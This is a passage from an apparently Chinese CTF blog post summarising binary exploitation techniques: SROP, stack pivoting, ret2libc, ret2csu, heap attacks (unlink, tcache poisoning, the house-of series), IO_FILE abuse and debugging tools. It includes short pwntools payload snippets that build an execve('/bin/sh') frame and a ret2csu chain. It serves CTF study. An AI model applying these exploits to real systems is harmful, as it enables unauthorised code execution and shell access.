Programming。在这里<code>sigreturn</code>是一个系统调用，它在unix系统发生signal的时候会被间接地调用。</p><p>pwntools有SigreturnFrame()可以快速编写payload</p><p>例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">frame = SigreturnFrame()<br>frame.rax=constants.SYS_execve<br>frame.rdi=binsh_addr<br>frame.rsi=<span class="hljs-number">0</span><br>frame.rdx=<span class="hljs-number">0</span><br>frame.rip=system_call<br></code></pre></td></tr></table></figure><p>当内核向某个进程发送一个signal，该进程会被暂时挂起，进入内核态，</p><p>然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal。内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用<code>sigreturn</code>系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条<code>ret</code>指令会使得执行流跳转到这段sigreturn代码，被动地进行<code>sigreturn</code>系统调用。</p><p>当signal handler返回之后内核为该进程恢复之前保存的上下文，最后恢复进程的执行</p><p>第一、这个<code>Signal Frame</code>是被保存在用户进程的地址空间中的，是用户进程可读写的；</p><p>第二、内核并没有将保存的过程和恢复的过程进行一个比较，也就是说，在<code>sigreturn</code>这个系统调用的处理函数中，内核并没有判断当前的这个<code>Signal Frame</code>就是之前内核为用户进程保存的那个<code>Signal Frame</code>。</p><p><strong>例</strong>：假设一个攻击者可以控制用户进程的栈，那么它就可以伪造一个<code>Signal Frame</code></p><p>在这个伪造的<code>Signal Frame</code>中，将<code>rax</code>设置成59（即<code>execve</code>系统调用号），将<code>rdi</code>设置成字符串<code>/bin/sh</code>的地址（该字符串可以是攻击者写在栈上的），将<code>rip</code>设置成系统调用指令<code>syscall</code>的内存地址，最后，将<code>rt_sigreturn</code>手动设置成<code>sigreturn</code>系统调用的内存地址。那么，当这个伪造的<code>sigreturn</code>系统调用返回之后，相应的寄存器就被设置成了攻击者可以控制的值，在这个例子中，一旦<code>sigreturn</code>返回，就会去执行<code>execve</code>系统调用，打开一个shell。</p><p><strong>总体来说：</strong></p><p>就是在栈上伪造fake_SigreturnFrame，我们利用sigreturn的机制，在返回时带参数的执行某个系统调用</p><h4 id="Stack-migration">Stack migration</h4><p>溢出长度不够时，就要用到栈迁移了，将ebp迁移到bss段或data段，构造gadget然后在这里执行</p><blockquote><p>leave相当于汇编 mov rsp,rbp;pop rbp;<br>ret相当于汇编pop eip;</p></blockquote><p>要进行<strong>栈溢出</strong>将<strong>ebp</strong>修改为<strong>目标地址</strong>(也就是需要进行迁移的地址)，并且把<strong>ret addr</strong>填充为<strong>leave;ret指令的地址</strong></p><p><img src="/2024/01/26/pwn%E6%80%BB%E7%BB%93/20230725214502-74acf9e2-2af1-1.png" alt="20230725214502-74acf9e2-2af1-1"></p><p>开始执行第一个<strong>leave;ret</strong>，首先是确保可以栈溢出将<strong>ebp,ret_addr</strong>都可以覆盖,之后将ebp修改为需要迁移到的地址(一般是我们构造好ROP链的位置)，ret_addr修改为leave;ret的指令的地址，之后<strong>mov esp,ebp</strong>，esp和ebp处于同一位置，指向同一个地址，之后<strong>pop ebp</strong>，将栈顶的内容弹出给ebp，之后我们的ebp就来到了<strong>目标地址</strong>，再<strong>ret-&gt;pop eip</strong>，我们的<strong>存有leave_ret_addr的地址</strong>就作为返回地址存储到了<strong>eip</strong>中，接下来立马再次执行一次<strong>leave;ret</strong></p><p>第二个<strong>leave;ret</strong>,此时ebp和esp的位置互换了，之后再执行<strong>mov ebp,esp</strong>就可以将esp迁移到ebp的位置，至此我们的esp,ebp已经完全迁移到目标地址了，之后再<strong>pop ebp</strong>，将栈顶没用的内容弹出，此时栈顶的内容就是<strong>system@plt</strong>的地址了，这个时候我们再执行ret-&gt;pop eip的话，其实就是将栈顶的内容也就是(可以是sytem@plt)弹入到eip中，我们接下来就是<strong>执行system@plt</strong>从而getshell</p><ul><li>第一次leave;ret，其实就是让ebp放入目标地址</li><li>第二次leave;ret，就是将esp也迁移到ebp的位置，之后pop ebp，esp指向下一个内存单元，如上图，这里esp是指向了system@plt，从而getshell</li></ul><h4 id="ret2shellcode">ret2shellcode</h4><p>shellcode要写在可以执行的段，控制程序流执行它</p><h4 id="ret2libc">ret2libc</h4><ul><li>第一步泄露libc地址，得到libc_base，计算出相应要用的地址（libc_base+XX函数地址）</li><li>第二步能溢出覆盖能控制ret，布置好ROP</li><li>第三步返回执行</li></ul><h4 id="ret2csu">ret2csu</h4><p>简单来说就是利用libc_csu_init中的两段代码片段来实现(rdi,rsi,rdx)3个参数的传递（间接性的传递参数）</p><p>x64 下的 __libc_csu_init 这个函数是用来对 libc 进行初始化操作的，而一般的程序用 libc 函数，所以这个函数一定会存在。</p><p>(不同版本的这个函数有一定的区别，需要对下面的payload略作修改)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rdi,rsi,rdx,function</span>):<br>    csu_front_addr=<span class="hljs-number">0x400740</span><br>    csu_end_addr=<span class="hljs-number">0x40075A</span><br>    payload = <span class="hljs-string">b&#x27;&#x27;</span><br>    payload += p64(csu_end_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(function) + p64(<br>        rdi) + p64(rsi) + p64(rdx)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    <span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure><h4 id="ret2dl-resolve">ret2dl_resolve</h4><p>大致是栈迁移到bss段伪造fake_linkmap结构体（伪造一整套延迟绑定用到的结构体欺骗系统）</p><ul><li>用于应对只能溢出0x10字节的情况，没有更多泄露手段</li><li>保护不能开启FULL RELRO（got表全都确定好地址了自然是不行）</li><li>理解较难，利用相对模板化</li><li>pwntools有Ret2dlresolvePayload模块</li></ul><h3 id="Heap-Exploitation">Heap Exploitation</h3><h4 id="realloc-malloc-calloc区别">realloc/malloc/calloc区别</h4><ul><li><p>malloc</p><blockquote><p>void* malloc (size_t size);</p></blockquote><p>根据size来申请内存，使用ptmalloc进行内存管理</p></li><li><p>realloc</p><blockquote><p>void* realloc (void* realloc_ptr, size_t size);</p></blockquote><p>可以对内存的大小做灵活的调整，具体参数设置会有如下效果：</p><blockquote><p>size == 0 ，这个时候等同于free<br>realloc_ptr == 0 &amp;&amp; size &gt; 0 ， 这个时候等同于malloc<br>malloc_usable_size(realloc_ptr) &gt;= size， 这个时候等同于edit<br>malloc_usable_size(realloc_ptr) &lt; size， 这个时候才是malloc一块更大的内存，将原来的内容复制过去，再将原来的chunk给free掉</p></blockquote></li><li><p>calloc</p><blockquote><p>void* calloc (size_t num, size_t size);</p></blockquote><p>calloc函数有将申请到的空间初始化为0的功能，而malloc函数没有这个功能。</p><p>使用calloc申请内存时不会分配 tcache chunk 中的 chunk 。</p></li></ul><p>由于 __ realloc_hook 与  __ malloc_hook 相邻，因此在 heap exploit 中有着这样一种手法便是同时修改这两个 hook，通过 __libc_realloc 中的一些 gadget 调整堆栈以满足one_gadget一些特定的要求</p><p>这是因为one_gadget并非任何时候都是通用的，都有一定的先决条件</p><h4 id="malloc-hook-free-hook-exit-hook运用">malloc_hook/free_hook/exit_hook运用</h4><p>在低版本中，有很多好用的hook，假如我们能任意地址写，就能很方便的改写这些hook帮助我们getshell</p><p>例：修改free_hook为system，释放带有/bin/sh字符串的堆，即可getshell</p><p>所常说的exit hook，就是 _ rtld_global结构体中的两个函数指针_ dl_rtld_lock_recursive与_dl_rtld_unlock_recursive，我们只需要改写这两个中的一个指针为one_gadget，执行exit后就可以拿到shell,不同版本地址有所不同</p><h4 id="泄露地址的方法">泄露地址的方法</h4><h5 id="libc地址">libc地址</h5><p>（除 fastbin 与 tcache 以外）bins 与空闲 chunk 间构成双向链表结构，利用这个特性我们便可以泄漏出main_arena 的地址，进而泄漏出 libc 的基址，一般用 unsorted bin 中的 chunk 泄露 libc 地址</p><h5 id="heap地址">heap地址</h5><p>libc2.29及以上，tcache key 所用的值便是 tcache 结构体本身的地址，故若我们能够打印 tcache key ，就能直接获得堆基址</p><p>glibc2.32 起新增了 safe-linking 机制用以保护存放在 tcache 与 fastbin 中的 chunk 指针，保证 chunk 链表的完整性</p><p>但是 safe-linking 机制同样存在着其缺点：对于 tcache 而言，第一个被放入 tcache 的 chunk 的 fd 指针在经过 safe-linking 后会被写入一个<strong>未加密的堆上相关地址</strong>（与 0 异或），因而我们可以通过该 chunk 的 fd 指针泄露堆基址，有了堆基址我们便能很轻松地绕过 safe-linking 机制的保护</p><p>同样地，若是我们能够打印 tcache 中 free chunk 的 bd 字段，则同样可以获得 tcache key，以此泄露堆基址，绕过 safe-linking</p><h4 id="Chunk-Extend-and-Overlapping">Chunk Extend and Overlapping</h4><p>堆块重叠即我们<strong>同时拥有两个或以上的下标指向同一个 chunk</strong>（同一个地址），在这样的情况下便可以手动实现 double free 、地址泄露（例如释放一个下标后通过另一个下标打印 chunk 内容从而获得<strong>堆/libc</strong>相关地址）等各种利用，十分方便</p><h4 id="Unlink">Unlink</h4><p>unlink的作用就是摘掉chunk</p><p><img src="/2024/01/26/pwn%E6%80%BB%E7%BB%93/20200911135522507.png" alt="20200911135522507"></p><p><img src="/2024/01/26/pwn%E6%80%BB%E7%BB%93/20200911152738722.png" alt="20200911152738722"></p><p>在执行free()函数时执行了 _int_free()函数，在 _int_free()函数中调用了unlink宏</p><p>unlink其实是libc中定义的一个宏，libc2.23里的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span><br>    FD = P-&gt;fd;      <br>    BK = P-&gt;bk;      <br>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))      <br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  <br>    <span class="hljs-keyword">else</span> &#123;      <br>        FD-&gt;bk = BK;      <br>        BK-&gt;fd = FD;      <br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)      <br>            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;      <br>    <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)      <br>|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    <br>      malloc_printerr (check_action,      <br>       <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    <br>       P, AV);      <br>            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>) &#123;      <br>                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)      <br>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      <br>                <span class="hljs-keyword">else</span> &#123;      <br>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      <br>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      <br>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      <br>                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      <br>                  &#125;      <br>              &#125; <span class="hljs-keyword">else</span> &#123;      <br>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      <br>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      <br>              &#125;      <br>          &#125;      <br>      &#125;      <br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里面会有对双向链表进行检查</p><blockquote><p><strong>2.23里的chunk状态检查</strong>：</p><p><strong>检查1</strong>：检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</p><p><strong>检查2</strong>：检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</p><p><strong>检查3</strong>：检查前后被释放chunk的fd和bk</p></blockquote><p>利用思路大致来讲就是伪造一个chunk，让系统以为它是空闲的chunk，然后free触发unlink向上合并，造成堆重叠，效果就是bss段里的指针数组指向它自己（我自己认为是另一种doublefree）,可以任意地址写</p><blockquote><p>要理解它还得是实打实做几道题，这些个题目都可以用unlink解</p><p><a href="https://nqoinaen.cn/2020/11/24/buu%E5%88%B7%E9%A2%98/#hitcon2014-stkof">hitcon2014_stkof</a></p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121176333?ops_request_misc=%7B%22request%5Fid%22%3A%22170650880116777224418705%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id=170650880116777224418705&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-121176333-null-null.nonecase&amp;utm_term=unlink">zctf_2016_note3</a></p><p><a href="https://nqoinaen.cn/2020/11/24/buu%E5%88%B7%E9%A2%98/#hitcontraining-unlink">hitcontraining_unlink</a></p><p><a href="https://nqoinaen.cn/2020/11/24/buu%E5%88%B7%E9%A2%98/#hitcontraining-bamboobox">hitcontraining_bamboobox</a></p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121411787?spm=1001.2014.3001.5502">sctf_2019_easy_heap</a></p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121429481?spm=1001.2014.3001.5502">x_nuca_2018_offbyone2</a></p></blockquote><h4 id="Fastbin-Attack">Fastbin Attack</h4><h5 id="size检查">size检查</h5><p>在malloc取出fastbin中的chunk时会检查其size字段，<strong>若与其对应下标不相符则会引发程序abort，限制了我们所能构造fake chunk的位置</strong>，但该size检查<strong>不会检查标志位</strong></p><blockquote><p>一般fastbin attack中分配到__ malloc_hook附近的fake chunk通常都是malloc(0x60)，也就是size == 0x71，这是因为在__malloc_hook - 0x23这个地址上fake chunk的SIZE的位置刚好是<code>0x7f</code>，满足了绕过fastbin的size检查的要求</p></blockquote><h4 id="Large-Bin-Attack">Large Bin Attack</h4><p><code>glibc</code>高版本移除了<code>__malloc_hook/__free_hook/__realloc_hook</code>等等一众<code>hook</code>全局变量，<code>ctf</code>中<code>pwn</code>题对<code>hook</code>钩子的利用将逐渐成为过去式。而想要在高版本利用成功，基本上就离不开对<code>IO_FILE</code>结构体的伪造与<code>IO</code>流的攻击。<code>largebin attack</code>是高版本(2.34及以后)中为数不多的可以任意地址写一个堆地址的方法</p><blockquote><p>libc2.31后的largebin attack：<br>我们能控制在large_bin中的chunkA的bk_nextsize为target-0x20（target就是我们要改写的地址）<br>然后如果有个在unsortbin中的chunkB，A的size要大于B的size，接着我们申请一个大于B的size的堆，<br>B就会放到largebin里，然后我们可以发现target就被改写为了B这个堆的地址</p></blockquote><h4 id="Tcache-Poisoning">Tcache Poisoning</h4><p>通过诸如 tcache double free 等方式，我们可以达到修改 tcache_entry 的 next 指针的目的，从而在任意地址分配到一个 chunk，这种手法也叫做<strong>tcache poisoning</strong></p><h4 id="Fastbin-Reverse-to-Tcache">Fastbin Reverse to Tcache</h4><blockquote><p>fastbin reverse to tcache的攻击效果是往target-0x18处的地址写入对应tcache的bk指针，也就是一个堆地址</p></blockquote><h4 id="Tcache-Stashing-Unlink-Attack">Tcache-Stashing-Unlink-Attack</h4><p><strong>攻击目标</strong></p><ol><li>向任意指定位置写入一个地址（可以认为是很大的值）。（更深的利用方式可任意地址读写）</li><li>向任意地址分配一个Chunk。</li></ol><p><strong>攻击前提</strong></p><ol><li>能控制 Small Bin Chunk 的 bk 指针。</li><li>程序可以越过Tache取Chunk。(使用calloc即可做到)</li><li>程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。</li></ol><blockquote><p><a href="https://blog.csdn.net/m0_51251108/article/details/127121786?spm=1001.2014.3001.5502">hitcon_ctf_2019_one_punch</a></p><p><a href="https://blog.csdn.net/m0_51251108/article/details/127078196?spm=1001.2014.3001.5502">2020 新春红包题</a></p></blockquote><p><a href="https://www.anquanke.com/post/id/198173">Tcache Stashing Unlink Attack利用思路-安全客 - 安全资讯平台 (anquanke.com)</a></p><h4 id="ROP-in-heap">ROP in heap</h4><h5 id="environ">environ</h5><h5 id="setcontext">setcontext</h5><h6 id="2-29以前">2.29以前</h6><p><strong>setcontext + 53</strong></p><h6 id="2-29以后">2.29以后</h6><h4 id="House">House</h4><p><code>Glibc</code> 的 <code>house of</code> 系列攻击手法基于都是围绕着堆利用和 <code>IO FILE</code> 利用，更多是在打组合拳。可以跟着<a href="https://github.com/shellphish/how2heap">how2heap</a>进行学习，这里列举一些我所知道的</p><p><strong>House Of Force</strong></p><p>House Of Force着眼点在于对top chunk 的攻击</p><blockquote><p>练习：</p><p><a href="https://nqoinaen.cn/2020/11/24/buu%E5%88%B7%E9%A2%98/#gyctf-2020-force">gyctf_2020_force</a></p><p><a href="https://nqoinaen.cn/2020/11/24/buu%E5%88%B7%E9%A2%98/#hitcontraining-bamboobox">hitcontraining_bamboobox</a></p></blockquote><p><strong>House of Orange</strong></p><p>用于应对没有free这种情况</p><blockquote><p><a href="https://blog.csdn.net/m0_51251108/article/details/121344075?ops_request_misc=%7B%22request%5Fid%22%3A%22170651507116800180673323%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id=170651507116800180673323&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-121344075-null-null.nonecase&amp;utm_term=orange&amp;spm=1018.2226.3001.4450">houseoforange_hitcon_2016（unsortbin attack，fsop）-CSDN博客</a></p></blockquote><p><strong>House of Roman</strong></p><p><strong>House of botcake</strong></p><p>可以在仅使用一次uaf的情况下，绕过tcache的key值检测，造成tcache poioning的效果，并且能重复使用</p><blockquote><p>练习：</p><p>[DASCTF X GFCTF 2022十月挑战赛magic_book](<a href="https://nqoinaen.cn/2022/10/28/DASCTF">https://nqoinaen.cn/2022/10/28/DASCTF</a> X GFCTF 2022十月挑战赛/#magic-book)</p></blockquote><p><strong>House of Pig</strong></p><p><strong>House of banana</strong></p><p><strong>House of Corrosion</strong></p><p><strong>House of emma</strong></p><p><strong>House of wiki</strong></p><p><strong>House of cat</strong></p><p>House of Cat利用了House of emma的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过TLS上 <strong>_pointer_chk_guard</strong>的检测相关的IO函数的调用，转而调用**_IO_wfile_jumps<strong>中的</strong>_IO_wfile_seekoff<strong>函数，然后进入到</strong>_IO_switch_to_wget_mode<strong>函数中来攻击，从而使得攻击条件和利用变得更为简单。并且house of cat在</strong>FSOP<strong>的情况下也是可行的，只需修改虚表指针的偏移来调用</strong>_IO_wfile_seekoff<strong>即可（通常是结合</strong>__malloc_assert**，改vtable为**_IO_wfile_jumps+0x10**）。</p><p><strong>利用条件</strong></p><p>1.能够任意写一个可控地址。<br>2.能够泄露堆地址和libc基址。<br>3.能够触发IO流（FSOP或触发__malloc_assert，或者程序中存在puts等能进入IO链的函数），执行IO相关函数。</p><blockquote><p>练习：</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/127290280?spm=1001.2014.3001.5502">house of cat 学习-CSDN博客</a></p><p><a href="https://blog.csdn.net/m0_51251108/article/details/127374315?spm=1001.2014.3001.5502">house of emma-CSDN博客</a>house of emma同名题用house of cat 来解</p></blockquote><p><strong>House of apple</strong></p><p><strong>House of apple2</strong></p><blockquote><p>练习：</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/127416752?spm=1001.2014.3001.5501">2021祥云杯PassWordBox_ProVersion-CSDN博客</a>使用了其中两种调用链来解</p></blockquote><p><strong>House of apple3</strong></p><p><strong>house利用方法汇总：</strong><a href="https://roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#2-house-of%E7%B3%BB%E5%88%97">Glibc堆利用之house of系列总结 - roderick - record and learn! (roderickchan.github.io)</a></p><h3 id="I-O-File-Exploitation">I/O File Exploitation</h3><h4 id="I-O-leak">I/O leak</h4><p>在pwn题中，当遇到没有可以用来泄露的功能时，我们一般将堆块分配到stdout指针处存储的_IO_2_1_stdout_该IO_FILE结构体处，修改其 _ flags为0xfbad1800，将后面三个read指针置空，将_ IO_write_base处的第一个字节改为0x58，后面的_ IO_write_ptr和_ IO_write_end保持不变。之后当程序遇到puts函数时就会打印 _ IO_write_base到_ IO_write_ptr之间的内容，按照上面步骤改动的话，我们泄露出的第一个libc地址是_IO_file_jumps。<br>  至于为啥需要flags=0xfbad1800（flags也可以是0xfbad3887），这里分析起来十分复杂，可以参见puts源码，只能说为了达到输出效果需要这样设置，另外该flags这样设置只是针对puts函数，其余打印函数略有不同</p><h4 id="FSOP">FSOP</h4><p>FSOP即 File Stream Oriented Programme——文件流导向编程，即基于 glibc 中文件流相关的一种劫持手法，其核心思想便是通过劫持文件流的相关流程以达到控制程序执行流的目的</p><h3 id="shellcode">shellcode</h3><p><code>shellcode</code> 是一段可被 <code>CPU</code> 直接执行的程序码,使用 <code>shellcode</code> 进行攻击是一项经典而强大的技术，借助 <code>shellcode</code> 几乎可以完成任何事情，包括但不限于泄露敏感信息、反弹 <code>shell</code>、布置后门等。</p><p>编写 <code>shellcode</code> 的方式有很多，而方式的选择取决于实际场景。如当需要编写复杂的 <code>shellcode</code> 的时候，需要手搓；当需要注入特定模板的 <code>shellcode</code> 时，可以采用工具生成；当需要观察 <code>shellcode</code> 的字符、长度时，可以采用在线网站生成。</p><p><a href="https://roderickchan.github.io/zh-cn/2023-02-20-the-art-of-shellcode/">Linux下的shellcode技巧总结 - roderick - record and learn! (roderickchan.github.io)</a></p><p><a href="https://bbs.kanxue.com/thread-274652.htm#msg_header_h2_7">可见shellcode字符的艺术</a></p><h3 id="Tools">Tools</h3><h4 id="IDA-Pro">IDA Pro</h4><p>ida在pwn中用的不深，会一些基本的，然后会IDA_Patch即可</p><p>F5反汇编</p><p>alt+T</p><p>shift+f12查看程序里的字符串</p><p>n：更改变量的名称</p><p>g：直接跳转到某个地址</p><p>/ ：在反编译后伪代码的界面中写下注释</p><p>strip去符号的题，加签名文件，可以显示部分函数名</p><h4 id="pwndbg-peda-gef">pwndbg/peda/gef</h4><p>三者我认为pwndbg最好用，有一些好用的指令，在用gdb连接qemu进行调试时也不太卡</p><ul><li><p>基本指令</p><ul><li>si//单步步入，遇到调用跟进函数中</li><li>ni //单步步过，遇到函数不跟进</li><li>b *地址//段指定地址，b *main</li><li>b *$ rebase(0x123456) //$rebase 在调试开PIE的程序的时候可以直接加上程序的随机地址</li><li>vmmap //内存分配情况</li><li>r//运行</li><li>c//继续</li></ul></li><li><p>查看内存指令x</p><ul><li>x/32gx 地址  //我喜欢用这个，打印地址的内容以16进制</li><li>x /10i 0x123456 //从0x123456处向后显示十条汇编指令</li></ul></li><li><p>打印指令p</p></li><li><p>修改指令set</p><ul><li><code>set $rdi=0x10</code> //把rdi寄存器的值变为0x10</li><li><code>set *(0x123456)=0x10</code> //0x123456地址的值变为0x10，<strong>注意带星号</strong></li></ul></li><li><p>堆操作指令</p><ul><li><p><code>arena</code> //显示arena的详细信息</p><ul><li><code>arenas</code> //显示所有arena的基本信息</li><li><code>arenainfo</code> //<strong>好看的显示</strong>所有arena的信息</li></ul></li><li><p><code>bins</code> //</p><p>常用，查看所有种类的堆块的链表情况</p><ul><li><code>fastbins</code> //单独查看fastbins的链表情况</li><li><code>largebins</code> //同上，单独查看largebins的链表情况</li><li><code>smallbins</code> //同上，单独查看smallbins的链表情况</li><li><code>unsortedbin</code> //同上，单独查看unsortedbin链表情况</li><li><code>tcachebins</code> //同上，单独查看tcachebins的链表情况</li><li><code>tcache</code> //查看tcache详细信息</li></ul></li><li><p><code>heap</code> //</p><p>数据结构的形式显示所有堆块，会显示一大堆</p><ul><li><code>heapbase</code> //<strong>查看堆起始地址</strong></li><li><code>heapinfo</code>、<code>heapinfoall</code> //显示堆得信息，和bins的挺像的，<strong>没bins好用</strong></li><li><code>parseheap</code> //显示堆结构，<strong>很好用</strong></li></ul></li><li><p><code>tracemalloc</code> //<strong>好用</strong>，会跟提示所有操作堆的地方</p></li></ul></li><li><p>其他pwndbg插件独有指令</p><ul><li><code>cyclic 50</code> //生成50个用来溢出的字符，如：aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</li><li><code>$reabse</code> //<strong>开启PIE的情况的地址偏移</strong><ul><li><code>b *$reabse(0x123456)</code> //断住PIE状态下的二进制文件中0x123456的地方</li><li><code>codebase</code> //打印PIE偏移，<strong>与rebase不同，这是打印，rebase是使用</strong></li></ul></li><li><code>stack</code> //<strong>查看栈</strong></li><li><code>retaddr</code> //打印包含返回地址的栈地址</li><li><code>canary</code> //直接看canary的值</li><li><code>plt</code> //查看plt表</li><li><code>got</code> //查看got表</li><li><code>hexdump</code> //像IDA那样显示数据，<strong>带字符串</strong></li></ul></li></ul><h4 id="pwntools">pwntools</h4><p>必备的库，会用它可以大大加快编写exp的速度</p><p>要充分了解它的许多有用模块可从<a href="http://docs.pwntools.com/">官方文档</a>着手</p><h4 id="seccomp-tools">seccomp-tools</h4><p>Secommp (SECure COMPuting) 是 Linux 内核 2.6.12 版本引入的安全模块，主要是用来限制某一进程可用的系统调用 (system call)。</p><p>我们可以用这个工具来可以分析程序的seccomp状态，看禁用了哪些系统调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">seccomp-tools dump ./pwn<br></code></pre></td></tr></table></figure><h4 id="patchelf">patchelf</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">patchelf --replace-needed libc.so.6 你要换的libc的硬路径 ./pwn<br>patchelf --set-interpreter ld的硬路径 ./pwn<br></code></pre></td></tr></table></figure><h4 id="one-gadget">one_gadget</h4><p>可以用来寻找万能gadget去getshell</p><p>可以设置参数查找等级，找到更多可用的gadget</p><p>例：<code>one_gadget ./libc-2.27.so -l 1</code> 设置等级level1</p><h4 id="glibc-all-in-one">glibc-all-in-one</h4><h2 id="知识储备">知识储备</h2><h3 id="常用的系统调用">常用的系统调用</h3><h4 id="system">system</h4><p>要rop出<code>system(“/bin/sh\x00”)</code></p><p>参数</p><blockquote><p>rdi=“/bin/sh\x00”字符串的地址</p></blockquote><h4 id="execve">execve</h4><blockquote><p>int execve(const char *filename, char *const argv[], char *const envp[]);</p></blockquote><p>要rop出<code>execve('/bin/sh\x00',0,0)</code></p><p>参数:</p><blockquote><p>rdi='/bin/sh\x00’字符串的地址<br>rsi=0 or 地址-&gt;0<br>rdx=0 or 地址-&gt;0</p></blockquote><h4 id="open-read-write">open/read/write</h4><h4 id="mprotect">mprotect</h4><p>int mprotect(const void *start, size_t len, int prot)</p><p>可以用于给某段地址提升权限为可读可写可执行（rwx）,只需要prot参数等于7(111B)</p><p>start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍,不然会调用失败</p><h3 id="ptmalloc堆数据结构">ptmalloc堆数据结构</h3><h3 id="ptmalloc堆管理机制">ptmalloc堆管理机制</h3><h3 id="More">More</h3><h2 id="小结">小结</h2><h2 id="参考">参考</h2><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">Environment - CTF Wiki (ctf-wiki.org)</a></p><p><a href="https://lantern.cool/note-pwn-linux-protect/">Linux 常用保护机制 | Lantern’s 小站</a></p><p><a href="https://www.cnblogs.com/murkuo/p/15965270.html">pwndbg 基本操作指令 - MuRKuo - 博客园 (cnblogs.com)</a></p><p><a href="https://xz.aliyun.com/t/12738?time__1311=mqmhDvOGOFYKDsD7Gt0%3DbG%3DD8UwZ2xxi%3D4D&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F">栈迁移原理深入理解以及实操 - 先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/chennbnbnb/article/details/109284780">glibc2.31下的新double free手法/字节跳动pwn题gun题解_glibc 2.31下存在doublefree吗-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_54218833/article/details/130426404">CTF-pwn pwntools用法探索</a></p><p><a href="https://blog.csdn.net/qq_41202237/article/details/108481889">好好说话之unlink_unlink 操作什么时候发生-CSDN博客</a></p><p><a 